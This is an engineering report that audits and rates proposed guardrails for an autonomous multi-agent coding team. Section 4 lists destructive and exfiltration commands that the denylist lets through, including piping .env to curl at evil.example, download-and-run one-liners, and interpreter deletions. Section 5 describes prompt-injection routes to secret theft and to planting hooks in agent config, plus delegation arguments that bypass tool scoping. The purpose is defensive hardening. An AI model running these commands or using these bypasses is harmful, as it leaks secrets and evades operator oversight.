# Tools for the agent team: catalog and ratings

> **Snapshot.** This report describes the code at commit 09f238e. The safety hook, ledger and CLI have changed since (PR #2 and its review fixes), so check claims about current behavior against the source.

Assessed against commit `09f238e` on branch `refactor/prompts-in-markdown`, with `@anthropic-ai/claude-agent-sdk` 0.3.283 (`package.json:13`). SDK citations are to `node_modules/@anthropic-ai/claude-agent-sdk/sdk.d.ts` ("`sdk.d.ts`") and `sdk-tools.d.ts`.

**Evidence labels.** **[Observed]** means I checked it: I read it in the code or types, or I ran it. The safety-rule results come from a scratch script outside the repo that imported `__testing.denyReason` (`src/permissions.ts:170`) and called it with sample inputs. A few facts come from running `strings` over the bundled CLI binary (`claude-agent-sdk-darwin-arm64/claude`); those are marked **[Observed in binary]** because the published types don't state them. **[Inferred]** means I reasoned it from the types or code and didn't check it at runtime. No `query()` run was made, because that would cost money.

---

## 1. Summary

The team's main promises are "destructive commands stay blocked under `--yes`", "per-role tool scoping", "qa-tester is the frontier-tier judge" and "never report done without evidence". At present the first three are only partly enforced and the fourth isn't enforced at all. The highest-value work is therefore a few small hooks and one CLI option that make those promises hold. New capabilities such as a browser, a database or a simulator come second. Four items earn P1. All four are tens to low hundreds of lines and change no system prompt or tool definition:

- a delegation guard on the `Agent` tool
- hardening the existing safety hook against the bypasses I observed
- a harness-recorded evidence ledger
- `--resume`

Browser verification and an OS sandbox are worth building, but each needs a safety decision or an experiment first. Several apparent gaps are better closed with prompt or tool-list edits (section 6) than with new tools.

| #   | Tool                                              | Kind                            | Roles affected                                               | Usefulness | Priority    | One-line purpose                                                                                                    |
| --- | ------------------------------------------------- | ------------------------------- | ------------------------------------------------------------ | ---------- | ----------- | ------------------------------------------------------------------------------------------------------------------- |
| 1   | Delegation guard                                  | Hook (PreToolUse on `Agent`)    | orchestrator (constrains every delegation)                   | 5          | P1          | Only the ten defined roles can be spawned, with their defined model, so tool scoping and the opus judge hold        |
| 2   | Safety-hook hardening                             | Hook (edit `denyReason`)        | every role with Bash/Write/Edit/Read                         | 5          | P1          | Close the observed denylist bypasses, protect agent-config files, keep writes inside `--cwd`, and stop secret reads |
| 3   | Evidence ledger                                   | Hook (PostToolUse + Failure)    | all implementers, qa-tester, orchestrator, operator          | 5          | P1          | A harness-recorded record of which role ran which command and touched which file                                    |
| 4   | `--resume` flag                                   | SDK option (`resume`)           | orchestrator, database-specialist                            | 4          | P1          | Let the human answer the manager's question and continue the same session                                           |
| 5   | Verification gates                                | Hook (Stop + SubagentStop)      | orchestrator, qa-tester                                      | 5          | P2          | The run can't end with unreviewed implementation, and QA can't finish without running anything                      |
| 6   | OS sandbox for Bash                               | SDK option (`sandbox`)          | every role with Bash                                         | 4          | P2          | Kernel-enforced write and network limits where regex rules can't reach                                              |
| 7   | Browser verification (Playwright MCP)             | External MCP server             | qa-tester first, then frontend-engineer                      | 4          | P2          | A role can look at the rendered UI instead of guessing                                                              |
| 8   | `strictMcpConfig`                                 | SDK option                      | orchestrator                                                 | 3          | P2          | Stop the target repo's `.mcp.json` servers loading unscreened tools                                                 |
| 9   | Remove web tools from non-research advisory roles | Built-in tool removal           | architect, product-manager, ux-designer, monetization-expert | 3          | P2          | Remove the exfiltration and injection channel from roles that never need the web                                    |
| 10  | Main-thread write guard                           | Hook (PreToolUse)               | orchestrator                                                 | 3          | P2          | The manager delegates instead of editing code itself                                                                |
| 11  | Run budget and per-agent turn caps                | SDK option                      | all                                                          | 3          | P2          | A dollar ceiling for unattended runs that include opus subagents                                                    |
| 12  | Read-only `explain_query` tool                    | Custom in-process tool          | database-specialist                                          | 3          | P3          | Back performance claims with a real query plan                                                                      |
| 13  | Worktree isolation for parallel implementers      | Agent tool option (`isolation`) | implementers, qa-tester                                      | 3          | P3          | Parallel edits and pre-fix checks without clobbering each other                                                     |
| 14  | Read-only git history tool                        | Custom in-process tool          | architect, product-manager                                   | 2          | P3          | Advisory roles can see why code is the way it is                                                                    |
| 15  | Mobile simulator MCP                              | External MCP server             | mobile-developer                                             | 2          | P3          | Device verification of React Native changes                                                                         |
| 16  | Web access for implementers                       | Built-in tool addition          | backend, frontend, mobile, database, qa                      | 3          | Don't build | Library-docs lookup for roles that write code                                                                       |
| 17  | Markdown-only Write for ux-designer               | Built-in tool addition + hook   | ux-designer                                                  | 1          | Don't build | Let UX write its spec to a file as its prompt says                                                                  |
| 18  | qa-tester write scope (tests only)                | Hook (PreToolUse)               | qa-tester                                                    | 2          | Don't build | Keep the judge from editing the code it judges                                                                      |
| 19  | Structured-report tool                            | Custom in-process tool          | all specialists                                              | 1          | Don't build | Schema-checked final reports                                                                                        |
| 20  | Code-intelligence MCP (LSP or Serena)             | External MCP server             | architect, engineers                                         | 1          | Don't build | Symbol-level navigation                                                                                             |
| 21  | Payment-provider MCP (Stripe)                     | External MCP server             | monetization-expert                                          | 1          | Don't build | Live billing data for pricing design                                                                                |

---

## 2. What the team is trying to achieve

**Purpose (stated).** This is an "autonomous software development team built on the Claude Agent SDK" (`package.json:6`, `src/index.ts:17`). An Engineering Manager "decompose[s] it, delegate[s] it to the right specialist… and hold[s] the quality bar" (`src/orchestrator/prompt.md:1`). The team works on other repositories: "The team reads and writes real files in --cwd. Point it at a project directory, not at this one" (`src/index.ts:30-31`).

**Audience (partly stated, partly inferred).**

- Stated: one operator at a terminal answering `allow? [y/N]` prompts (`src/permissions.ts:157-159`), or an unattended run with `--yes` in "CI or a pipe" (`src/index.ts:133-138`).
- Inferred: the owner runs it against their own repositories. "Point --cwd at repos you trust" (`src/orchestrator/index.ts:60`) assumes the operator controls the target repo.
- Inferred: the team targets web, React Native and payments-heavy products, given the roster (`src/team.ts:16-27`) and the mobile prompt's Expo and React Native specifics (`src/agents/mobile-developer/prompt.md:1,14`).

**Goals (stated).**

- Decisions come before implementation, and nothing lands unverified (`src/orchestrator/prompt.md:11,13`).
- Evidence counts, assurance doesn't: "Do not report work as done on a specialist's assurance alone. Require the evidence — the test output, the file path, the command that was run" (`src/orchestrator/prompt.md:16`). Also "Never report a pass you did not observe; quote the output" (`src/agents/qa-tester/prompt.md:10`).
- Scope discipline: keep to what was asked (`src/orchestrator/prompt.md:18`), and prefer deleting to adding (`src/agents/architect/prompt.md:14`, `src/agents/business-strategist/prompt.md:14`).

**Design principles a new tool must respect.**

1. **Per-role tool scoping (stated).** "A role that only needs to reason about code should not be able to rewrite it — that is what keeps the architect's opinion and the engineer's diff reviewable as separate artifacts" (`src/agents/shared.ts:8-12`; commit `747b8a6`). Advisory roles get `READ_ONLY` (`shared.ts:13-19`) and implementers get `IMPLEMENTER` (`shared.ts:20-27`). Implication: a tool goes to the specific roles that need it, never to everyone.
2. **The safety layer lives in a PreToolUse hook, not in `canUseTool` (stated).** "`canUseTool` is skipped whenever the permission mode already auto-approves a call… The hook runs for every tool call in every mode, so 'yes to everything' still cannot mean 'yes to rm -rf'" (`src/permissions.ts:105-111`). `denyReason` is "the single source of truth" (`src/permissions.ts:61-64`), shared by the hook (`:122`) and the interactive gate (`:149`). Implication: new guardrails belong in that hook or alongside it, never only in `canUseTool`.
3. **`--cwd` is a trust boundary (stated).** `settingSources: ["project"]` loads the target's `.claude` tree, so "a repo's own settings.json hooks and .mcp.json servers load with it… its hooks are its own code. Point --cwd at repos you trust" (`src/orchestrator/index.ts:55-61`). Implication: anything an agent writes into the target's `.claude/` or `.mcp.json` runs as code on the next run. Any tool that brings in outside content adds to what flows across that boundary.
4. **System prompts and tool definitions stay byte-stable for the prompt cache (stated).** `loadPrompt` drops the BOM, normalizes line endings and strips trailing newlines "so the same prompt yields the same bytes… any drift between runs would invalidate the prompt cache" (`src/prompts.ts:4-10`). Prettier is kept off prompt files (`.prettierignore:1-3`, `.prettierrc:2-6`, commit `09f238e`) and Markdown is pinned to LF (`.gitattributes:1`). Implication: tool lists and MCP tool schemas must be static per role. Anything per-run, such as a timestamp, a session id or a dynamic tool list, has to stay out of system prompts and tool definitions.
5. **The judge runs on the frontier tier (stated).** qa-tester runs on opus because "Cheap-tier judges measurably reduce defect recall… never [route cheap] for the thing that catches error" (`src/agents/qa-tester/index.ts:6-11`; commit `e3ef368`, which also notes "This raises the cost of every QA delegation").
6. **Unattended runs are always bounded (stated).** "An unattended run has no interactive brake, so it always gets a ceiling" (`src/orchestrator/index.ts:62-63`, default 60 at `:18`).
7. **Prompts are data and reload on every run (stated).** `src/prompts.ts:4-5`, `src/orchestrator/index.ts:7`, commit `e5b448a`. A prompt edit costs almost nothing, which is why section 6 matters.

---

## 3. How a task flows

1. `pnpm start "<task>"` runs `tsx src/index.ts` (`package.json:8`).
2. `main` parses arguments (`src/index.ts:99-106` → `parseArgs` at `:34-89`). `--cwd` sets the target (`:58-60`) and `--file` reads the task (`:83-85`).
3. `--roles` loads every prompt and exits (`:113-123`). Otherwise the code prints an auth notice (`:125-131`) and refuses to run without a TTY unless `--yes` is given (`:135-138`).
4. `runTeam` is called (`src/index.ts:140-147` → `src/orchestrator/index.ts:38`).
5. Prompts are loaded. `loadTeam()` reads each `prompt.md` (`src/team.ts:34-41` → `src/prompts.ts:11-20`). `loadOrchestratorPrompt()` fills `{{roster}}` (`src/orchestrator/index.ts:8-15` → `src/prompts.ts:29-45`).
6. `Options` are built (`src/orchestrator/index.ts:39-65`):
   - the `claude_code` system-prompt preset with the manager prompt appended (`:44-48`)
   - the full `claude_code` tool preset for the manager (`:49`)
   - `acceptEdits` mode under `--yes`, `default` otherwise (`:50`)
   - the safety hooks (`:52`)
   - `canUseTool` only when the run is interactive (`:54`)
   - `settingSources: ["project"]` (`:61`)
   - `maxTurns` (`:63`)
7. `query()` starts (`:67`). The manager calls the `Agent` tool with a `subagent_type` (`sdk-tools.d.ts:750-787`). The renderer shows `→ <role>` (`src/render.ts:80-83`).
8. Each tool call a subagent makes goes through the PreToolUse hook (`src/permissions.ts:116-136` → `denyReason` at `:65-103`). In `default` mode it then reaches the readline gate (`:145-167`). Under `--yes`, `acceptEdits` approves it without asking. The hook carries `agent_id` and `agent_type` when it fires inside a subagent (`sdk.d.ts:180-187`), which implies hooks do fire there **[Inferred]**.
9. Messages stream to the renderer (`src/render.ts:15-74`). Subagent `tool_use` blocks arrive by default with `parent_tool_use_id` set (`sdk.d.ts:1860-1866`, `:3608`), but the renderer doesn't attribute them to a role (`src/render.ts:31-34`).
10. The `result` message becomes `RunSummary` (`src/orchestrator/index.ts:79-91`). The CLI prints the result or error and the session id, then exits (`src/index.ts:149-157`).

---

## 4. Role-by-role capability gaps

| Role                    | What the prompt demands                                                                                                                                                                                                             | Tools it has                                                                                                                                                                                               | Gap                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| ----------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **orchestrator**        | Delegate rather than do the work (`orchestrator/prompt.md:1`). Use "the single most appropriate specialist" (`:9`). Require evidence (`:16`). Never land unverified work (`:13`). Come back to the human with one question (`:19`). | Full `claude_code` preset (`orchestrator/index.ts:49`), including `Agent` with any `subagent_type` and an optional `model` override (`sdk-tools.d.ts:762-766`).                                            | **Large.** (a) "Evidence" is whatever the specialist writes in its final message, and the harness records nothing the manager can check. (b) It can ask a question but can't receive an answer: the run ends, and `index.ts:154-156` prints a session id the CLI can't resume. (c) The CLI's own text says an omitted `subagent_type` "starts a fresh agent (general-purpose by default)" **[Observed in binary]**. That gives the manager an escape from the ten scoped roles. (d) `model` "takes precedence over the agent definition's model" (`sdk-tools.d.ts:764`), so the manager can run qa-tester on haiku, which undoes commit `e3ef368`. (e) It holds Write, Edit and Bash although it is told not to do specialist work **[Inferred from the preset]**. |
| **product-manager**     | Read the codebase before specifying, and point at existing files (`product-manager/prompt.md:13`).                                                                                                                                  | `READ_ONLY`: Read, Grep, Glob, WebSearch, WebFetch (`shared.ts:13-19`; `product-manager/index.ts:7`).                                                                                                      | **No meaningful capability gap.** It holds surplus web tools that the prompt never asks for (see #9).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| **architect**           | Cite `path:line` (`architect/prompt.md:13`). Give "the migration path from the code that exists today" (`:10`).                                                                                                                     | `READ_ONLY` (`architect/index.ts:7`).                                                                                                                                                                      | **Small.** It can't see git history (no Bash), so it can't learn why the current structure exists (#14, P3). It holds surplus web tools (#9).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| **ux-designer**         | "You produce specs and **may write markdown**" (`ux-designer/prompt.md:14`).                                                                                                                                                        | `READ_ONLY`, with no Write (`ux-designer/index.ts:7`).                                                                                                                                                     | **Prompt and tools disagree.** It can't write the Markdown its prompt allows. The prompt edit in section 6 is the right fix. Surplus web tools (#9).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| **backend-engineer**    | Write tests "that prove it works" (`backend-engineer/prompt.md:3,8`).                                                                                                                                                               | `IMPLEMENTER`: Read, Write, Edit, Grep, Glob, Bash (`shared.ts:20-27`).                                                                                                                                    | **Verification is invisible.** It can run tests, but nothing records that it did (#3). It has no web access, which is acceptable (#16).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| **frontend-engineer**   | Build every state, and keep it accessible (`frontend-engineer/prompt.md:6-7`). "You cannot see a browser… say so plainly" (`:14`).                                                                                                  | `IMPLEMENTER` (`frontend-engineer/index.ts:7`).                                                                                                                                                            | **Acknowledged gap:** it can't see the rendered UI (#7).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| **mobile-developer**    | "You cannot run a simulator here. State explicitly what still needs device verification" (`mobile-developer/prompt.md:15`).                                                                                                         | `IMPLEMENTER` (`mobile-developer/index.ts:7`).                                                                                                                                                             | **Acknowledged gap:** no device verification (#15, P3). The prompt already handles it honestly.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| **database-specialist** | "Quantify performance claims with the query plan or the row counts" (`database-specialist/prompt.md:15`). "Flag anything that risks data loss before doing it, and **stop for confirmation**" (`:16`).                              | `IMPLEMENTER` (`database-specialist/index.ts:7`). Bash inherits the operator's environment (`sdk.d.ts:1641-1647`), so it can reach a database only if the operator's shell happens to have one configured. | **Two gaps.** (a) There's usually no database to EXPLAIN against (#12). (b) A subagent has no confirmation channel: under `--yes` nothing pauses, and the destructive commands it should stop for (`prisma migrate reset --force`, `dropdb`) aren't denied **[Observed]** (#2, #4).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| **qa-tester**           | Run the tests, quote the output, never report an unobserved pass (`qa-tester/prompt.md:4,10`). Regression tests must fail before the fix (`:7`).                                                                                    | `IMPLEMENTER` on opus (`qa-tester/index.ts:11-12`).                                                                                                                                                        | **Largest gap after the orchestrator.** Nothing proves the quoted output came from a command it ran (#3, #5). It can also edit the production code it is judging (#18). Its opus tier can be overridden by the manager (#1).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| **monetization-expert** | "hand implementation to backend-engineer and payment-critical review to qa-tester" (`monetization-expert/prompt.md:17`).                                                                                                            | `READ_ONLY` (`monetization-expert/index.ts:7`).                                                                                                                                                            | **Small, prompt-only.** A subagent can't hand off because it has no `Agent` tool; only the manager routes. The prompt should say "recommend", not "hand" (section 6).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| **business-strategist** | Label repository facts, research and assumptions separately; cite sources for numbers (`business-strategist/prompt.md:13,15`).                                                                                                      | `READ_ONLY`, including WebSearch and WebFetch (`business-strategist/index.ts:7`).                                                                                                                          | **No meaningful gap.** This is the one role that needs the web.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |

**Gaps in the safety layer itself.** These affect every role. I probed `denyReason` with 57 inputs and recorded the results **[Observed]**:

- **Allowed (I expected these to be blocked):**
  - Delete and discard: `rm -R build`, `rm --recursive --force build`, `find . -delete`, `git checkout -- .`, `git restore --staged --worktree .`, `git branch -D main`, `git stash drop`.
  - Force-push and database: `git push origin +main` (a force push via `+refspec`), `npx prisma migrate reset --force`, `npx prisma db push --accept-data-loss`, `dropdb prod`.
  - Download-and-run: `curl … -o i.sh && sh i.sh`, `bash <(curl …)`, `wget -qO- … | sh`.
  - Interpreter one-liners: `python3 -c "…shutil.rmtree('src')"`, `node -e "…rmSync…"`, and `python3 -c "open('.env','w')…"`, a `.env` write that skips the redirect check.
  - Secret reads: `Read .env`, `Grep … .env`, `cat .env`, `cat .env | curl -d @- https://evil.example`.
  - Writes outside `--cwd`: Write to `/Users/someone/.zshrc`, Write to `../other-repo/src/a.ts`, and `echo … >> ~/.zshrc`.
  - Writes to agent configuration: Write to `.claude/settings.json` and `.mcp.json`, and `mkdir -p .claude && echo … > .claude/settings.json`.
  - Other paths and tools: `.envrc`, `server.key`, `.npmrc`, `git config core.hooksPath`, and any `mcp__*` tool (an `mcp__db__query` call with `DROP TABLE` passed).
- **Blocked, as intended:** `rm -rf`, `rm -r -f`, `git push --force-with-lease`, `psql -c 'drop table users'`, `curl … | bash`, `echo … > .env`, `printf x>.env`, `sed -i … .env`, `cp id_rsa …`, `pnpm publish`, and Write to `.env`, `.env.production` and `.git/hooks/*`.
- **Delegation checks:** `denyReason("Agent", {subagent_type: "general-purpose"})` and `denyReason("Agent", {subagent_type: "qa-tester", model: "haiku"})` both return null, so the hook doesn't look at delegations at all.

---

## 5. Tool catalog

### 1. Delegation guard (PreToolUse rule on the `Agent` tool)

- **Kind and roles:** A hook rule added to `createSafetyHooks` (`src/permissions.ts:112-139`). It constrains the orchestrator and protects every role definition.
- **Purpose:** Orchestrator gaps (c) and (d) in section 4. Scoping tools per role (`shared.ts:8-12`) only works if delegations go to scoped roles. The opus judge (`qa-tester/index.ts:6-11`) only holds if the manager can't override the model.
- **What it achieves:** A delegation to anything other than the ten roles in `ROLES` (`src/team.ts:31`) is denied with a reason the manager can act on. That covers an omitted `subagent_type`, `general-purpose` and `fork`. A `model` that differs from the role's defined model is denied too, so qa-tester always runs on opus. `isolation: "remote"` is denied, because a remote agent would run outside this process's hooks **[Inferred]**.
- **How it would work:** `PreToolUseHookInput` provides `tool_name` and `tool_input` (`sdk.d.ts:2737-2743`). Match `tool_name` of `"Agent"`, and also `"Task"`, because `AgentInfo`'s doc still says "invoked via the Task tool" (`sdk.d.ts:106-107`) while `render.ts:80` uses `"Agent"`. Check `subagent_type`, `model` and `isolation` (`sdk-tools.d.ts:762`, `:763-766`, `:783-786`). Return `permissionDecision: "deny"` (`sdk.d.ts:2745-2751`). Put the rule inside `denyReason` so `canUseTool` shares it (`permissions.ts:149`). Size: **tens of lines**, plus a few probe cases.
- **Impact:**
  - Quality: delegations reach roles with the right prompt and tools, and QA verdicts come from the tier the commit history chose.
  - Safety: no new surface. It closes a route around tool scoping.
  - Cost: nothing per run, except a wasted turn if the manager tries a bad delegation.
  - Prompt cache: no change to system prompts or tool definitions.
- **Risks and open questions:**
  - Whether built-in agents (`general-purpose`, `Explore`, `Plan`) are actually offered next to programmatic `agents` isn't settled by the types. I only saw the "general-purpose by default" string in the CLI binary. To settle it, read the `agents` array on the `system`/`init` message (already logged at `src/render.ts:19-22`) on the next real run.
  - Whether the tool name is `Agent` or `Task` is ambiguous, so match both.
  - `HookCallbackMatcher.matcher` semantics aren't documented (`sdk.d.ts:968-973`). Filter inside the callback, as the existing hook does.
- **Rating:** **Usefulness 5.** Without it, two promises in the code and commit history can be bypassed by a single tool argument: per-role scoping and the opus judge. **Priority P1.** Tens of lines, no safety downside, no prompt-cache effect.
- **Smallest useful version:** Deny `subagent_type` values that aren't in `ROLES`, and deny any `model` override on qa-tester. Add one line to `orchestrator/prompt.md` naming the rule so the manager doesn't waste turns (section 6).

### 2. Safety-hook hardening (edit `denyReason`)

- **Kind and roles:** Hook rule changes in `src/permissions.ts:12-103`. They constrain every role that has Bash, Write, Edit or Read.
- **Purpose:** The safety-layer gaps listed at the end of section 4. The usage text promises "destructive commands stay blocked" under `--yes` (`src/index.ts:25`). The probes show common equivalents getting through.
- **What it achieves:**
  - The observed bypasses are denied. That covers `rm` with `-R` or `--recursive`, `find -delete`, `git checkout -- .` and `git restore`, `git push … +ref`, `git branch -D`, `git stash drop|clear`, `prisma migrate reset` and `db push --accept-data-loss`, `dropdb`, `wget|sh`, `bash <(curl…)`, and download-then-execute.
  - Write and Edit to a path that resolves outside the hook's `cwd` (`BaseHookInput.cwd`, `sdk.d.ts:174`) are denied.
  - Writes to `.claude/**`, `.mcp.json` and `.envrc` are denied. These are files that `settingSources: ["project"]` or direnv will execute later (`src/orchestrator/index.ts:55-61`). This closes the route where a prompt-injected implementer plants a hook that runs on every future run.
  - Reads of secret files are denied for Read, Grep and `cat`/`less`/`head` in Bash. Advisory roles hold both Read and WebFetch (`shared.ts:13-19`), so a poisoned file or page can tell them to read `.env` and fetch `https://attacker/?k=…`.
  - `mcp__*` calls whose `mcp_server.source` isn't `"sdk"` get a conservative rule. The provenance field is at `sdk.d.ts:2742`, and its source values are listed at `:1219-1225`.
- **How it would work:** Extend `HARD_DENY`, `PROTECTED_WRITE` and `PROTECTED_IN_COMMAND`, and add read-protection and cwd-containment checks in `denyReason`. The hook already receives every tool call (`permissions.ts:116-136`). Add a table-driven test that calls `__testing.denyReason`. The export exists (`permissions.ts:170`) but no test runner is configured (`package.json:7-11`). Size: **tens of lines of rules, about 100 lines of tests.**
- **Impact:**
  - Quality: neutral. Legitimate destructive operations go back to the human, as the deny message already says (`permissions.ts:73`).
  - Safety: strictly tighter.
  - Cost: nothing.
  - Prompt cache: no change.
- **Risks and open questions:**
  - A regex denylist can't be complete. Interpreter one-liners (`python -c`, `node -e`) and arbitrary scripts will always get through, which is why #6 exists.
  - False positives grow as rules are added, for example a legitimate `rm -R dist`.
  - Should `CLAUDE.md` be protected as well? Agents editing it can be legitimate work, but it's loaded as instructions on the next run. This is an owner decision.
  - Whether `acceptEdits` already refuses writes outside the working directory isn't stated in the types (`sdk.d.ts:1983-1991`). The hook rule makes the question moot.
- **Rating:** **Usefulness 5.** The CLI's stated guarantee (`index.ts:25`, `permissions.ts:105-111`) doesn't hold for the observed cases. **Priority P1.** Small, testable without API calls, and it only tightens.
- **Smallest useful version:** The observed bypasses, the config-path rule (`.claude/`, `.mcp.json`) and the outside-`cwd` Write rule, plus the probe script turned into a test file.

### 3. Evidence ledger (PostToolUse and PostToolUseFailure hooks)

- **Kind and roles:** Hooks plus a run-summary printer. Every implementer and qa-tester is recorded. The orchestrator and the human operator read the result.
- **Purpose:** Orchestrator gap (a) and the qa-tester gap. The manager is told to "Require the evidence — the test output, the file path, the command that was run" (`orchestrator/prompt.md:16`), and QA is told to "Never report a pass you did not observe" (`qa-tester/prompt.md:10`). Today the only evidence is the specialist's own prose.
- **What it achieves:** At the end of every run the operator sees a per-role ledger, for example:
  - `qa-tester#a1b2: pnpm test (1.8s, failed: "Exit code 1")`
  - `backend-engineer#c3d4: Edit src/api/orders.ts`

  The ledger is written by the harness, not the model. A claim of "tests pass" can then be checked against a recorded command and outcome. The renderer's unattributed tool lines (`render.ts:31-34`) gain role attribution.

- **How it would work:**
  - `PostToolUse` provides `tool_name`, `tool_input`, `tool_response` and `duration_ms` (`sdk.d.ts:2654-2665`). `PostToolUseFailure` provides `error` and `is_interrupt` (`sdk.d.ts:2635-2647`). Both carry `agent_id` and `agent_type` inside subagents (`sdk.d.ts:180-187`).
  - Record Bash commands, Write and Edit paths, and failures to an in-memory list, optionally mirrored to a JSONL file outside `--cwd` and keyed by `session_id` (`sdk.d.ts:172`).
  - Print the ledger after the result in `src/index.ts:149-157`.
  - Optional: on `PostToolUse` for the `Agent` tool with `status: "completed"` (`sdk-tools.d.ts:100-149`), return `additionalContext` (`sdk.d.ts:2667-2669`) so the manager sees a one-line summary of what that `agentId` actually ran. `AgentOutput.toolStats.bashCount` (`sdk-tools.d.ts:135-144`) is also available for free.
  - Alternative with no hooks: rebuild the ledger from the message stream, using subagent `tool_use` and `tool_result` blocks with `parent_tool_use_id` (`sdk.d.ts:1860-1866`, `:3608`). That loses `agent_type`.
  - Size: **about 100–200 lines.**
- **Impact:**
  - Quality: the manager and the human can tell "ran and passed" from "said it passed".
  - Safety: the ledger may contain secrets that appeared in stdout. Keep it out of `--cwd`, and record command, status and a short stderr tail rather than full output.
  - Injection: the optional `additionalContext` must carry only the harness's own fields (command, status). Copying tool output into it would hand untrusted text to the manager with harness framing; `sdk.d.ts:2671` warns against exactly that for the related `classifierContext`.
  - Cost: none for the printed ledger. A few dozen tokens per delegation if `additionalContext` is used.
  - Prompt cache: `additionalContext` enters the conversation, not the system prompt, so no break **[Inferred]**.
- **Risks and open questions:**
  - **Unresolved by the types:** `BashOutput` has no exit-code field (`sdk-tools.d.ts:3236-3341`). It has only `interrupted` and `returnCodeInterpretation`. The CLI binary contains `Exit code ${…exitCode}` formatting **[Observed in binary]**, which suggests a non-zero exit shows up as error text, possibly through `PostToolUseFailure`. To settle it, run one cheap haiku-model session that executes `false` and log which hook fires. That costs a few cents.
  - Delegations run in the background by default (`sdk-tools.d.ts:767-770`, `async_launched` at `:150-160`). The `Agent` `PostToolUse` may then fire at launch, before there's anything to summarize. That's why the smallest version prints at the end instead of injecting.
- **Rating:** **Usefulness 5.** The project's central quality promise ("evidence, not assurance") can't be verified today. **Priority P1.** Moderate size, and the safety concerns are handled by what gets recorded and where it's stored.
- **Smallest useful version:** Record Bash commands, `duration_ms`, success or failure, and Write/Edit paths, keyed by `agent_type#agent_id`. Print the ledger after the result. No `additionalContext` yet.

### 4. `--resume <session-id>` CLI flag

- **Kind and roles:** An SDK option (`Options.resume`). It helps the orchestrator and database-specialist directly.
- **Purpose:** Orchestrator gap (b) and the database-specialist's "stop for confirmation". The manager is told to "come back to the human with one focused question instead of guessing" (`orchestrator/prompt.md:19`). Today the answer needs a fresh run that re-spends every earlier delegation, even though the CLI already prints `Session: <id>` (`src/index.ts:154-156`).
- **What it achieves:** `pnpm start --resume <id> "Use soft deletes; proceed"` continues the same conversation with the manager's plan and the specialists' results intact. A destructive migration can be proposed, paused for the human and then carried out.
- **How it would work:** Pass `resume` (`sdk.d.ts:2081-2084`) through `RunOptions` to `queryOptions`. Sessions persist by default (`persistSession` defaults to true, `sdk.d.ts:1807-1814`). `forkSession` (`sdk.d.ts:1702-1706`) lets the human try an alternative answer without overwriting. Size: **tens of lines** (flag parsing in `index.ts:43-81`, one option in `orchestrator/index.ts:39-65`, usage text).
- **Impact:**
  - Quality: questions get answered instead of guessed, as the prompt intends.
  - Safety: neutral, because the same hooks apply to resumed runs.
  - Cost: lower than re-running. The resumed prefix can hit the cache if prompt files haven't changed.
  - Prompt cache: unchanged when prompts are unchanged. If someone edits a `prompt.md` between runs, the resumed session sees the new prompt and misses the cache once **[Inferred]**.
- **Risks and open questions:** The types don't say what happens when `agents` or `systemPrompt` differ from the original session, or when `--cwd` differs. Sessions are stored per project directory (`sdk.d.ts:1809`). Require the same `--cwd`, or record it next to the session id.
- **Rating:** **Usefulness 4.** The manager's prompt requires a question-and-answer loop it can't complete, and ambiguous tasks are common. **Priority P1.** Tens of lines and no new surface.
- **Smallest useful version:** A `--resume <id>` flag that requires a task string (the answer) and the same `--cwd`. Add one line of usage text.

### 5. Verification gates (Stop and SubagentStop hooks)

- **Kind and roles:** Hooks on the main-thread `Stop` and on `SubagentStop` for `agent_type === "qa-tester"`. They constrain the orchestrator and qa-tester.
- **Purpose:** "Never let an implementation land unverified" (`orchestrator/prompt.md:13`) and "Never report a pass you did not observe" (`qa-tester/prompt.md:10`) are instructions, not checks.
- **What it achieves:**
  - If any implementer wrote files after the last completed qa-tester delegation, the manager can't end the run without delegating to QA or saying why not.
  - qa-tester can't end its turn without having run at least one command.
- **How it would work:**
  - The `Stop` hook input has `stop_hook_active` and `background_tasks` (`sdk.d.ts:9440-9457`). `additionalContext` is "non-error feedback… the conversation continues" (`sdk.d.ts:9459-9465`).
  - `SubagentStop` has `agent_type`, `agent_id` and `last_assistant_message` (`sdk.d.ts:9478-9498`), and its `additionalContext` is delivered to the subagent, which "continues so it can act on it" (`sdk.d.ts:9500-9506`).
  - State comes from the ledger (#3). Push back only once, using `stop_hook_active` to avoid loops.
  - Size: **about 100 lines** on top of #3.
- **Impact:**
  - Quality: turns the manager's sequencing rule (`orchestrator/prompt.md:11`) into a check.
  - Safety: neutral.
  - Cost: a forced QA pass is an extra opus delegation (commit `e3ef368`), which can be dollars per triggered run.
  - Prompt cache: no change.
- **Risks and open questions:**
  - With background delegations (`sdk-tools.d.ts:767-770`), `Stop` may fire while QA is still running. `background_tasks` exists to tell these cases apart, but its behavior needs one experiment.
  - Tasks that are legitimately QA-free, such as docs-only changes, need an exemption, perhaps "only for files matching source globs".
  - The types don't say whether `decision: "block"` (`sdk.d.ts:9512`) or `additionalContext` is the better lever for `Stop`.
- **Rating:** **Usefulness 5.** It enforces two stated guarantees. **Priority P2.** It depends on #3 and needs an experiment on stop-loop and background-task behavior first.
- **Smallest useful version:** Only the `Stop` rule, based on Write and Edit by implementer roles versus a later completed qa-tester delegation, with a single push-back.

### 6. OS sandbox for Bash (`Options.sandbox`)

- **Kind and roles:** An SDK option. It constrains every role with Bash: the five implementers and qa-tester, and the orchestrator if it keeps Bash.
- **Purpose:** #2 can't catch `python -c`, `node -e`, scripts or outside-`cwd` shell writes, and it can't stop network exfiltration. The `--yes` promise (`index.ts:25`) needs something below regex.
